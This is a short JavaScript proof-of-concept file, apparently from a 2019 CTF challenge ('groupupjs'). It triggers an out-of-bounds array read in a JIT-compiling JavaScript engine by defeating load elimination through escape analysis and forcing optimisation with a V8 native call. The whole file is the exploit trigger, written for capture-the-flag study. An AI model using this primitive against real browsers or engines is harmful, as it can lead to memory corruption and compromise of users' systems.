/************************************************************
 * File Name: poc.js
 * 
 * Created on: 2020-02-05 22:33:35
 * Author: raycp
 * 
 * Last Modified: 2020-02-08 01:23:48
 * Description: poc for qwb 2019 final groupupjs 
************************************************************/

function foo(x)
{
    let a = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6];
    let tmp = {escapeVal: a.length}; // bypass load elimination with escape analysis
    return a[tmp.escapeVal]; // oob read
}

console.log(foo(""));
%OptimizeFunctionOnNextCall(foo);
console.log(foo("foo"));
